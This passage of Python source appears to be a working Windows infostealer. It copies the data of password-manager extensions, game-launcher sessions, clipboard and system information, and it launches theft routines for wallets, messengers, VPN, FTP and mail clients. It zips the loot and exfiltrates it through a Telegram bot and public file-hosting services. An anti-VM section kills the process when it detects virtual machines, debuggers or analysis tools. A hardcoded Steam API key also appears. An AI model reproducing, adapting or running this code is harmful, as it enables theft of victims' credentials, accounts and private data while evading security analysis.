                "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
                "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data")
            }

            password_mgr_dirs = {
                "aeblfdkhhhdcdjpifhhbdiojplfjncoa": "1Password",
                "eiaeiblijfjekdanodkjadfinkhbfgcd": "NordPass",
                "fdjamakpfbbddfjaooikfcpapjohcfmg": "DashLane",
                "nngceckbapebfimnlniiiahkandclblb": "Bitwarden",
                "pnlccmojcmeohlpggmfnbbiapkmbliob": "RoboForm",
                "bfogiafebfohielmmehodmfbbebbbpei": "Keeper",
                "cnlhokffphohmfcddnibpohmkdfafdli": "MultiPassword",
                "oboonakemofpalcgghocfoadofidjkkk": "KeePassXC",
                "hdokiejnpimakedhajhdlcegeplioahd": "LastPass",
                "imloifkgjagghnncjkhggdhalmcnfklk": "Trezor",
            }

            for browser_name, browser_path in browser_paths.items():
                if os.path.exists(browser_path):
                    for root, dirs, files in os.walk(browser_path):
                        if "Local Extension Settings" in dirs:
                            local_extensions_settings_dir = os.path.join(root, "Local Extension Settings")
                            for password_mgr_key, password_manager in password_mgr_dirs.items():
                                extension_path = os.path.join(local_extensions_settings_dir, password_mgr_key)
                                if os.path.exists(extension_path):
                                    password_mgr_browser = f"{password_manager} ({browser_name})"
                                    password_dir_path = os.path.join(directory_path, "Password Managers", password_mgr_browser)
                                    os.makedirs(password_dir_path, exist_ok=True)
                                    if Path(extension_path).is_dir():
                                        shutil.copytree(Path(extension_path), password_dir_path, dirs_exist_ok=True)
                                    else:
                                        shutil.copy2(Path(extension_path), password_dir_path)
                                    location_file = os.path.join(password_dir_path, "Location.txt")
                                    with open(location_file, 'w') as loc_file:
                                        loc_file.write(f"Copied {password_manager} from {extension_path} to {password_dir_path}")
            if len(os.listdir(password_dir_path)) == 0:
                os.rmdir(password_dir_path)
        except Exception as e:
            error_handler(f"password manager error - {str(e)}")


    async def StealSteamUser(self) -> None:
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z')+1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)

            for steam_paths in all_disks:
                steam_paths = os.path.join(steam_paths + ":\\", "Program Files (x86)", "Steam", "config", "loginusers.vdf")
                if os.path.isfile(steam_paths):
                    with open(steam_paths, "r", encoding="utf-8", errors="ignore") as file:
                        steamid = "".join(re.findall(r"7656[0-9]{13}", file.read()))
                        if steamid:
                            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                                url1 = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids={steamid}"
                                url2 = f"https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}"
                                url3 = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid={steamid}&include_appinfo=true&include_played_free_games=true"

                                async with session.get(url1) as req:
                                    player_summary = await req.json()

                                async with session.get(url2) as req2:
                                    player_level = await req2.json()

                                async with session.get(url3) as req3:
                                    player_games = await req3.json()

                                player_data = player_summary["response"]["players"][0]
                                personname = player_data["personaname"]
                                profileurl = player_data["profileurl"]
                                timecreated = player_data["timecreated"]
                                creation_date = datetime.utcfromtimestamp(timecreated).strftime('%d-%m-%Y')

                                if player_data.get("realname"):
                                    realname = player_data["realname"]
                                else:
                                    realname = "None"

                                level = player_level["response"]["player_level"]
                                total_games = player_games["response"]["game_count"]

                                ListFonction.SteamUserAccounts.append(f"Real Name: {realname}\nPerson Name: {personname}\nProfile URL: {profileurl}\nCreation Date: {creation_date}\nPlayer Level: {level}\nTotal games: {total_games}\n")
                                
        except Exception as e:
            error_handler(f"steam user error - {str(e)}")


    async def StealUbisoft(self, directory_path: str) -> None:
        try:
            ubisoft_path = os.path.join(self.localappdata, "Ubisoft Game Launcher")
            copied_path = os.path.join(directory_path, "Games", "Uplay")
            if os.path.isdir(ubisoft_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                for file in os.listdir(ubisoft_path):
                    name_of_files = os.path.join(ubisoft_path, file)
                    try:
                        shutil.copy(name_of_files, os.path.join(copied_path, file))
                    except:
                        continue
        except Exception as e:
            error_handler(f"ubisoft error - {str(e)}")
            pass

    async def StealEpicGames(self, directory_path: str) -> None:
        try:
            epic_path = os.path.join(self.localappdata, "EpicGamesLauncher", "Saved", "Config", "Windows")
            copied_path = os.path.join(directory_path, "Games", "Epic Games")
            if os.path.isdir(epic_path):
                if not os.path.exists(copied_path):
                    os.mkdir(copied_path)
                try:
                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
                except:
                    pass

        except Exception as e:
            error_handler(f"epicgames error - {str(e)}")
            pass

    async def StealGrowtopia(self, directory_path: str) -> None:
        try:
            growtopia_path = os.path.join(self.localappdata, "Growtopia", "save.dat")
            copied_path = os.path.join(directory_path, "Games", "Growtopia")
            if os.path.isfile(growtopia_path):
                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
        except Exception as e:
            error_handler(f"growtopia error - {str(e)}")
            pass

    async def StealSteamFiles(self, directory_path: str) -> None:
        try:
            save_path = os.path.join(directory_path)
            steam_path = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
            if os.path.isdir(steam_path):
                to_path = os.path.join(save_path, "Games", "Steam")
                if not os.path.isdir(to_path):
                    os.mkdir(to_path)
                shutil.copytree(steam_path, os.path.join(to_path, "Session Files"))
        except Exception as e:
            error_handler(f"steamfiles error - {str(e)}")
            return "null"
        
    

    async def StealBattleNet(self, directory_path) -> None:
        battle_net_path = os.path.join(self.appdata, 'Battle.net')
        if not os.path.exists(battle_net_path):
            return

        try:

            battle_path = os.path.join(directory_path, "Games", "Battle Net")
            os.makedirs(battle_path, exist_ok=True)

            for pattern in ["*.db", "*.config"]:
                for root, dirs, files in os.walk(battle_net_path):
                    for file in files:
                        if file.endswith(tuple(pattern.split("*"))):
                            try:
                                file_path = os.path.join(root, file)
                                if os.path.basename(root) == "Battle.net":
                                    destination_dir = directory_path
                                else:
                                    destination_dir = os.path.join(directory_path, os.path.basename(root))

                                os.makedirs(destination_dir, exist_ok=True)

                                shutil.copy(file_path, os.path.join(destination_dir, file))
                            except Exception as e:
                                error_handler(f"get battlenet files error - {str(e)}")
                                return


        except Exception as e:
            error_handler(f"battlenet error - {str(e)}")
            pass



    async def InsideFolder(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)

            if os.path.isdir(filePath):
                shutil.rmtree(filePath)

            os.mkdir(filePath)
            os.mkdir(os.path.join(filePath, "Computer"))
            os.mkdir(os.path.join(filePath, "Games"))
            
          
            if ListFonction.SystemInfo:
                with open(os.path.join(filePath, "Computer", "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SystemInfo:
                        file.write(value)
            if ListFonction.ClipBoard:
                with open(os.path.join(filePath, "Computer", "clipboard_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.ClipBoard:
                        file.write(value)
            if ListFonction.InstalledSoftware:
                with open(os.path.join(filePath, "Computer", "softwares_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.InstalledSoftware:
                        file.write(value)
            if ListFonction.TasksList:
                with open(os.path.join(filePath, "Computer", "tasklist_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.TasksList:
                        file.write(value)
            if ListFonction.Network:
                with open(os.path.join(filePath, "Computer", "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Network:
                        file.write(value)
            if ListFonction.Processes:
                with open(os.path.join(filePath, "Computer", "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.Processes:
                        file.write(value)


            if ListFonction.Autofills:
                with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for autofill in ListFonction.Autofills:
                        file.write(autofill)


        
            if ListFonction.SteamUserAccounts:
                with open(os.path.join(filePath, "Sessions", "steam_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                    for value in ListFonction.SteamUserAccounts:
                        file.write(value)


            if len(os.listdir(os.path.join(filePath, "Computer"))) == 0:
                try:shutil.rmtree(os.path.join(filePath, "Computer"))
                except:pass
            

            tasks = [
                self.StealWallets(filePath),

                # Messengers
                self.StealTelegramSession(filePath),
                self.StealWhatsApp(filePath),
                self.StealSignal(filePath),
                self.StealSkype(filePath),
                self.StealElement(filePath),
                self.StealPidgin(filePath),
                self.StealTox(filePath),
                self.StealViber(filePath),

                # VPN Files
                self.StealProtonVPN(filePath),
                self.StealOpenVPN(filePath),
                self.StealSurfsharkVPN(filePath),
                self.StealNordVPN(filePath),
                
                
                # FTP Client
                self.StealFileZilla(filePath),
                self.StealWinSCP(filePath),
                self.StealPutty(filePath),

                # BackupMail
                self.BackupMailbird(filePath),
                self.BackupThunderbird(filePath),
                # self.StealOutlook(filePath),

                # Password Manager
                self.StealPasswordManagers(filePath),

                # Games
                self.StealUbisoft(filePath),
                self.StealEpicGames(filePath),
                self.StealGrowtopia(filePath),
                self.StealSteamFiles(filePath),
                self.StealBattleNet(filePath),
            ]
            await asyncio.gather(*tasks)

            folders_to_check = ["Messenger", "VPN", "Email", "Wallets", "FTP Clients", "Games", "Password Managers"]
            
            for folder in folders_to_check:
                try:
                    if len(os.listdir(os.path.join(filePath, folder))) == 0:
                        shutil.rmtree(os.path.join(filePath, folder))
                        print("shutil.rmtree(os.path.join(filePath, folder))")
                except Exception as e:
                    error_handler(f"remove empty folder error - {str(e)}")


        except Exception as e:
            error_handler(f"insidefolder error - {str(e)}")

    async def SendKeyWords(self) -> None:
        try:
            print("SendKeyWords")
            cookies = []
            passwords = []
            autofills = []
            
            words = ["keyword_example.com", "another_example.net"] 

            for word in words:
                found_autofill = any(word in autofill for autofill in ListFonction.Autofills)
                found_password = any(word in password for password in ListFonction.Passwords)
                found_cookie = any(word in cookie for cookie in ListFonction.Cookies)
                
                if found_cookie: 
                    cookies.append(word)
                if found_password: 
                    passwords.append(word)
                if found_autofill: 
                    autofills.append(word)
            text = f"<b>📚 <i><u>{platform.node()} - Keywords Results</u></i></b>\n\n"
            if cookies: 
                text += f"<b>Cookies:</b>\n<code>{', '.join(cookies if cookies else None)}</code>\n"
            if passwords: 
                text += f"<b>Passwords:</b>\n<code>{', '.join(passwords if passwords else None)}</code>\n"
            if autofills: 
                text += f"<b>Autofills:</b>\n<code>{', '.join(autofills if autofills else None)}</code>\n"

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    pass
        except Exception as e:
            error_handler(f"send keywords error - {str(e)}")

    async def SendAllData(self) -> None:
        try:
            hostname = platform.node()

            filePath = os.path.join(self.temp, hostname)
            shutil.make_archive(filePath, "zip", filePath)
            system_info = platform.uname()

            url = "https://ipinfo.io/json"
            resp = requests.get(url)
            data = resp.json()

            ipaddress = data.get("ip")
            region = data.get("region")
            country = data.get("country")
            location = data.get("loc", "").split(",")
            latitude = location[0] if len(location) > 0 else "Unknown"
            longitude = location[1] if len(location) > 1 else "Unknown"
            google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

            text = f"""
<b>👤  <i><u>{hostname} - All Info</u></i></b>

<b><i><u>System Info</u></i></b>

<b>Computer Host:</b> <code>{system_info.node}</code>
<b>Computer OS:</b> <code>{system_info.system} {system_info.release} {system_info.version}</code>
<b>Total Memory:</b> <code>{system_info.machine}</code>
<b>CPU:</b> <code>{system_info.processor}</code>

<b><i><u>IP Info</u></i></b>
<b>IP Address:</b> <code>{ipaddress}</code>
<b>Region:</b> <code>{region}</code>
<b>Country:</b> <code>{country}</code>
<b>Location:</b> <a href="{google_maps_link}">View on Google Maps</a>
"""

            send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            message_payload = {
                'chat_id': CHAT_ID,
                'text': text,
                'parse_mode': 'HTML'
            }

            async with aiohttp.ClientSession() as session:
                async with session.post(send, data=message_payload) as response:
                    if response.status != 200:
                        raise Exception(f"Failed to send message: {await response.text()}")

                if os.path.getsize(filePath + ".zip") / (1024 * 1024) <= 15:
                    send_document_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
                    async with aiohttp.ClientSession() as session:
                        with open(filePath + ".zip", 'rb') as file:
                            document_payload = {
                                'chat_id': CHAT_ID,
                            }
                            files = {
                                'document': file
                            }
                            async with session.post(send_document_url, data=document_payload, files=files) as response:
                                if response.status != 200:
                                    error_handler(f"Error sending file: {await response.text()}")
                else:
                    file_url = await UploadFiles.upload_file(filePath + ".zip")
                    if file_url is not None:
                        text = f"<b>{platform.node()} - File Link</b>\n\n<b>{file_url}</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send file link: {await response.text()}")
                    else:
                        text = "<b>Can't Send File With GoFile</b>"
                        message_payload['text'] = text
                        async with aiohttp.ClientSession() as session:
                            async with session.post(send, data=message_payload) as response:
                                if response.status != 200:
                                    raise Exception(f"Failed to send error message: {await response.text()}")

                try:
                    os.remove(filePath + ".zip")
                    shutil.rmtree(filePath)
                except Exception as e:
                    error_handler(f"Failed to remove files: {str(e)}")

        except Exception as e:
            error_handler(f"SendAllData error: {str(e)}")
        

class UploadFiles:
    @staticmethod
    async def getserver() -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://api.gofile.io/getServer") as request:
                    data = await request.json()
                    return data["data"]["server"]
        except Exception as e:
            error_handler(f"gofile server error - {str(e)}")
            return "store1"

    @staticmethod
    async def upload_gofile(path: str) -> str:
        try:
            server = await UploadFiles.getserver()
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post(f'https://{server}.gofile.io/uploadFile', data=form) as response:
                        data = await response.json()
                        if response.status == 200 and "data" in data:
                            return data["data"]["downloadPage"]
                        else:
                            return None
        except Exception as e:
            error_handler(f"gofile error - {str(e)}")
            return None

    @staticmethod
    async def upload_catbox(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('fileToUpload', file, filename=os.path.basename(path))
                    form.add_field('reqtype', 'fileupload')
                    form.add_field('userhash', '')
                    async with session.post('https://catbox.moe/user/api.php', data=form) as response:
                        result = await response.text()
                        if "catbox.moe" in result:
                            return result
                        else:
                            return None
        except Exception as e:
            error_handler(f"catbox error - {str(e)}")
            return None

    @staticmethod
    async def upload_fileio(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://file.io/', data=form) as response:
                        if response.status == 200:
                            data = await response.json()
                            return data.get("link")
                        else:
                            return None
        except Exception as e:
            error_handler(f"fileio error - {str(e)}")
            return None

    @staticmethod
    async def upload_uguu(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://uguu.se/api.php?d=upload', data=form) as response:
                        data = await response.json()
                        if "url" in data:
                            return data.get("url")
                        else:
                            return None
        except Exception as e:
            error_handler(f"uguu error - {str(e)}")
            return None

    @staticmethod
    async def upload_krakenfiles(path: str) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                with open(path, 'rb') as file:
                    form = aiohttp.FormData()
                    form.add_field('file', file, filename=os.path.basename(path))
                    async with session.post('https://krakenfiles.com/api/v1/file/upload', data=form) as response:
                        data = await response.json()
                        if "data" in data and "file" in data["data"]:
                            return data["data"]["file"]["url"]
                        else:
                            return None
        except Exception as e:
            error_handler(f"krakenfiles error - {str(e)}")
            return None

    @staticmethod
    async def upload_file(file_path: str) -> str:
        upload_attempts = [
            ('GoFile', UploadFiles.upload_gofile),
            ('Catbox', UploadFiles.upload_catbox),
            ('File.io', UploadFiles.upload_fileio),
            ('Uguu', UploadFiles.upload_uguu),
            ('KrakenFiles', UploadFiles.upload_krakenfiles),
        ]
        
        for platform, upload_method in upload_attempts:
            try:
                result = await upload_method(file_path)
                if result:
                    return result
            except Exception as e:
                error_handler(f"{platform} upload attempt error - {str(e)}")
                continue
        
        return "All upload attempts failed."

class InfoStealer:
    def __init__(self):
        self.loop = asyncio.get_event_loop()

    async def run_all_fonctions(self):
        await asyncio.gather(
            self.StealLastClipBoard(),
            self.StealNetworkInformation(),
            self.StealInstalledSoftware(),
            self.StealProcesses(),
            self.StealTasks(),
            self.StealSystemInfo()
        )
    
    async def get_command_output(self, command: str) -> str:
        process = await asyncio.create_subprocess_shell(command,stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
        stdout, stderr = await process.communicate()
        if stderr:
            error_handler(f"get command error")
        return stdout.decode(errors="ignore")

    async def StealLastClipBoard(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Clipboard")
            if output:
                ListFonction.ClipBoard.append(output)
        except Exception as e:
            error_handler(f"clipboard error - {str(e)}")

    async def StealNetworkInformation(self) -> None:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://ip-api.com/json") as response:
                    data = await response.json()
                    ip = data["query"]
                    country = data["country"]
                    city = data["city"]
                    timezone = data["timezone"]
                    isp_info = data["isp"] + f" {data['org']} {data['as']}"
                    ListFonction.Network.append(f"IP: {ip}\nCountry: {country}\nCity: {city}\nTimezone: {timezone}\nISP: {isp_info}")
        except Exception as e:
            error_handler(f"network error - {str(e)}")

    async def StealInstalledSoftware(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Version | ConvertTo-Json")
            software_list = json.loads(output)
            ListFonction.InstalledSoftware.extend([f"Name: {software['Name']}, Version: {software['Version']}" for software in software_list])
        except Exception as e:
            error_handler(f"installed softwares error - {str(e)}")

    async def StealProcesses(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-Process | Select-Object -Property Name, Id | ConvertTo-Json")
            processes_list = json.loads(output)
            ListFonction.Processes.extend([f"Name: {process['Name']}, Id: {process['Id']}" for process in processes_list])
        except Exception as e:
            error_handler(f"processes error - {str(e)}")

    async def StealTasks(self) -> None:
        try:
            output = await self.get_command_output("powershell.exe Get-ScheduledTask | Select-Object -Property TaskName | ConvertTo-Json")
            tasks_list = json.loads(output)
            ListFonction.TasksList.extend([f"TaskName: {task['TaskName']}" for task in tasks_list])
        except Exception as e:
            error_handler(f"tasks error - {str(e)}")

    async def StealSystemInfo(self) -> None:
        try:
            command = r'echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername'
            output = await self.get_command_output(command)
            ListFonction.SystemInfo.append(output)
        except Exception as e:
            error_handler(f"system infos error - {str(e)}")
            pass

class anti_vm:
    async def run_all_fonctions(self) -> None:
        tasks = [
            asyncio.create_task(self.check_disk_space()),
            asyncio.create_task(self.check_recent_files()),
            asyncio.create_task(self.check_process_count()),
            asyncio.create_task(self.check_virtual_memory()),
            asyncio.create_task(self.check_for_virtualization()),
            asyncio.create_task(self.check_for_suspicious_files()),
            asyncio.create_task(self.check_system_manufacturer())
        ]
        try:
            await asyncio.gather(*tasks)
        except Exception as e:
            error_handler(f"send all anti vm error - {str(e)}")

    async def check_disk_space(self) -> bool:
        try:
            total_disk_space_gb = sum(psutil.disk_usage(drive.mountpoint).total for drive in psutil.disk_partitions()) / (1024 ** 3)
            if total_disk_space_gb < 50:
                ctypes.windll.kernel32.ExitProcess(0)
            min_disk_space_gb = 50
            if len(sys.argv) > 1:
                min_disk_space_gb = float(sys.argv[1])
            free_space_gb = win32api.GetDiskFreeSpaceEx()[1] / 1073741824
            if free_space_gb < min_disk_space_gb:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"anti vm disk space error - {str(e)}")

    async def check_recent_files(self) -> bool:
        try:
            recent_files_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Recent')
            if len(os.listdir(recent_files_folder)) < 20:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"check recent files error - {str(e)}")

    async def check_process_count(self) -> None:
        try:
            if len(psutil.pids()) < 50:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"process count error - {str(e)}")

    async def check_virtual_memory(self) -> None:
        try:
            total_memory_gb = psutil.virtual_memory().total / (1024 ** 3)
            if total_memory_gb < 6:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"virtual memory error - {str(e)}")

    async def check_for_virtualization(self) -> None:
        try:
            process = await asyncio.create_subprocess_shell('wmic path win32_VideoController get name',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout, stderr = await process.communicate()
            video_controller_info = stdout.decode(errors='ignore').splitlines()
            if any(x.lower() in video_controller_info[2].strip().lower() for x in ("virtualbox", "vmware")):
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"virtualization error - {str(e)}")

    async def check_for_suspicious_files(self) -> None:
        try:
            temp_file_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Temp', 'JSAMSIProvider64.dll')
            if os.path.exists(temp_file_path):
                ctypes.windll.kernel32.ExitProcess(0)
            try:
                machine_name = platform.uname().machine.lower()
                if "dady harddisk" in machine_name or "qemu harddisk" in machine_name:
                    ctypes.windll.kernel32.ExitProcess(0)
            except AttributeError:
                pass

            suspicious_process_names = ["32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice"]
          
            running_processes = [
                process.name().lower() for process in psutil.process_iter(attrs=['name']) 
                if process.name().lower() in suspicious_process_names
            ]
            if running_processes:
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"sus files error - {str(e)}")

    async def check_system_manufacturer(self) -> None:
        try:
            process1 = await asyncio.create_subprocess_shell('wmic computersystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout1, stderr1 = await process1.communicate()

            process2 = await asyncio.create_subprocess_shell('wmic path Win32_ComputerSystem get Manufacturer',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE,shell=True)
            stdout2, stderr2 = await process2.communicate()

            if b'VMware' in stdout1 or b"vmware" in stdout2.lower():
                ctypes.windll.kernel32.ExitProcess(0)
        except Exception as e:
            error_handler(f"manufacturer error - {str(e)}")


        
if __name__ == '__main__':
    if os.name == "nt":
        anti = anti_vm()
        asyncio.run(anti.run_all_fonctions())

        main = get_data()
        asyncio.run(main.RunAllFonctions())
    else:
        print('run only on windows operating system')
